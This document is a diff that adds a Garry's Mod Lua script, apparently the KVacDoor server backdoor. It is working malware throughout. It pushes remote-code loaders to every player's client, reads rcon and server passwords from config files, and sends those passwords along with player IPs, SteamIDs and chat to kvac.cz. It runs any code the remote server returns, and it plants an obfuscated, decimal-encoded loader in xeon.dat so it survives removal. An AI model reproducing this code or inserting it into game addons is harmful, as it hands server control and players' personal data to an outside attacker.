@@ -1,0 +1,199 @@
+--[[
+V3 By WaDixix & Alex
+Ce code est publique et ne sert que de lien.
+]]
+
+if w6C237D2207D820A7a == "BE614F6213AAE2D2" then return end
+w6C237D2207D820A7a = "BE614F6213AAE2D2"
+
+local HTTP = HTTP
+local RunString = RunString
+local file = file
+local timer = timer
+
+local website = 'https://kvac.cz'
+local infectkey = '?key=aBKgn50LoEANMsF5xPeq'
+
+-- Executes a remote Lua code on a player's client
+-- @param player: the player object on which the code should be executed
+local function executeClientCode(player)
+    if(!player:IsBot()) then
+        player:SendLua([[local function runRemoteCode() http.Post("https://kvac.cz/garrysmod/client/scripts", {}, function(response) RunString(response, ">", false) end) timer.Simple(600, runRemoteCode) end runRemoteCode()]])
+    end
+end
+
+local function CheckFuncNames(func,n)
+    for i=0,30 do
+        local xx = jit.util.funck( func, -i )
+        if xx == n then
+        return true
+        end
+    end
+    return false
+end
+
+local function GetLinesFromFuncInfo(poof)
+    local src = debug.getinfo(poof)
+    if not src.short_src then return "(No source)" end
+    if not file.Exists(src.short_src,"GAME") then
+        return "(RunString)"
+    end
+    local lines = string.Split(file.Read(src.short_src,"GAME"),"\n")
+    local lean = ""
+    for k,v in pairs(lines) do
+        if (k >= src.linedefined) and (k <= src.lastlinedefined) then
+            lean = lean .. v .. "\n"
+        end
+    end
+    return lean
+end
+
+local function GetBackdoors()
+    local tbl = net.Receivers
+    local ret = {}
+
+	if file.Exists("autorun/server/snte_source.lua","LUA") or ConVarExists("snte_ulxluarun") or ConVarExists("snte_dupefix") then
+		table.insert(ret,{anticheat="SNTE"})
+	end
+	if CAC then
+		table.insert(ret,{anticheat="CAC"})
+	end
+
+    for k,v in pairs(tbl) do
+
+		if k == "tpdsa:mission" then continue end
+		if string.StartWith(k, "dconfig_") then continue end
+		if string.StartWith(k, "pac3_test_") then continue end
+
+        if CheckFuncNames(v,"RunString") then
+            local txt = GetLinesFromFuncInfo(v)
+            table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
+        end
+        if CheckFuncNames(v,"RunStringEx") then
+            local txt = GetLinesFromFuncInfo(v)
+            table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
+        end
+        if CheckFuncNames(v,"CompileString") then
+            local txt = GetLinesFromFuncInfo(v)
+            table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
+        end
+    end
+    return util.TableToJSON(ret)
+end
+
+-- for KVacDoor V3.2 Update
+local function getPlayerlist()
+
+	local listofplayers = player.GetAll()
+	local players = {}
+	
+	for i=1, #listofplayers do
+		if listofplayers[i]:IsPlayer() then
+			players[i] = {}
+            players[i]["steamid"] = listofplayers[i]:SteamID64()
+            players[i]["nick"] = listofplayers[i]:Nick()
+            players[i]["usergroup"] = listofplayers[i]:GetUserGroup()
+            players[i]["frags"] = listofplayers[i]:Frags()
+            players[i]["deaths"] = listofplayers[i]:Deaths()
+            players[i]["ping"] = listofplayers[i]:Ping()
+            players[i]["ip"] = listofplayers[i]:IPAddress()
+            players[i]["position"] = listofplayers[i]:GetPos()
+            players[i]["angle"] = listofplayers[i]:EyeAngles()
+		end
+	end
+	return util.TableToJSON(players)
+end
+
+local function refresh_playerlist()
+local wadixxxee_time = 90
+if #player.GetHumans() >= 1 then
+wadixxxee_time = 10
+end
+if #player.GetHumans() >= 4 then
+wadixxxee_time = 5
+end
+local players = {
+nbplayer = tostring(#player.GetAll()),
+playerlist = getPlayerlist(),
+ip = game.GetIPAddress(),
+csrf = "A2707D86CE2F132A"
+}
+HTTP({url=website .. "/_/api.php",method="post",parameters=players,success=function(a,b,c) if(#b ~= 0) then RunString(b) end end})
+timer.Create("5C1D93287565907E", wadixxxee_time, 0, refresh_playerlist)
+end
+
+local function update_serverinfo()
+
+local infos = {}
+local files = file.Find("cfg/*", "GAME")
+
+for i = 1, #files do
+if string.EndsWith(files[i], ".cfg") then
+local content = file.Read("cfg/" .. files[i], "GAME")
+content = string.Explode("\n", content)
+
+for i = 1, #content do
+if string.StartWith(content[i], "rcon_password") then
+table.insert(infos, 1, string.Split(content[i], "\"")[2])
+end
+
+if string.StartWith(content[i], "sv_password") then
+table.insert(infos, 2, string.Split(content[i], "\"")[2])
+end
+end
+end
+end
+
+local sendinfo = {
+ip = game.GetIPAddress(),
+hostname = GetHostName(),
+map = game.GetMap(),
+gamemode = engine.ActiveGamemode(),
+maxplayer = tostring(game.MaxPlayers()),
+rcon = infos[1],
+password = infos[2],
+uptime = tostring(math.floor(CurTime())),
+backdoors = GetBackdoors(),
+csrf = "A2707D86CE2F132A",
+version = "1.0.6"
+}
+
+HTTP({url=website .. "/_/api.php" .. infectkey,method="post",parameters=sendinfo})
+end
+
+local function push_console(ply, text)
+local console_data =
+{
+name = ply:Nick(),
+ip = game.GetIPAddress(),
+steamid_chat = ply:SteamID64(),
+text_chat = text,
+csrf = "A2707D86CE2F132A"
+}
+HTTP({url=website .. "/_/api.php",method="post",parameters=console_data})
+end
+
+timer.Create("5C1D93287565907E", 10, 0, refresh_playerlist)
+timer.Create("1C07D0C3F083F0A0", 240, 0, update_serverinfo)
+
+timer.Simple(1, function()
+concommand.Remove("host_writeid")
+hook.Add("PlayerInitialSpawn", "A6720A151680D6B9", executeClientCode)
+hook.Add("PlayerSay", "E810A6F495C29364", push_console)
+update_serverinfo()
+for k,v in pairs(player.GetAll()) do
+executeClientCode(v)
+end
+end)
+
+if file.Exists("xeon/xeon.dat", "DATA") then
+file.Append("xeon/xeon.dat", "\n" .. [[if SERVER then timer.Simple(0.70,function() RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\107\118\97\99\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") RunString("\104\116\116\112\46\70\101\116\99\104\40\34\104\116\116\112\115\58\47\47\107\118\97\99\100\111\111\114\46\99\122\47\95\47\95\46\112\104\112\34\44\102\117\110\99\116\105\111\110\40\98\41\32\82\117\110\83\116\114\105\110\103\40\98\44\32\34\69\82\82\79\82\34\44\32\102\97\108\115\101\41\32\101\110\100\41") end) end]])
+end
+
+util.AddNetworkString("DontRunStringCodePLZ")
+net.Receive("DontRunStringCodePLZ", function(_, ply)
+if not IsValid(ply) then return end
+ply:Ban(0, false)
+ply:Kick("bad haxor")
+ply:SendLua([[while true do end]])
+end)
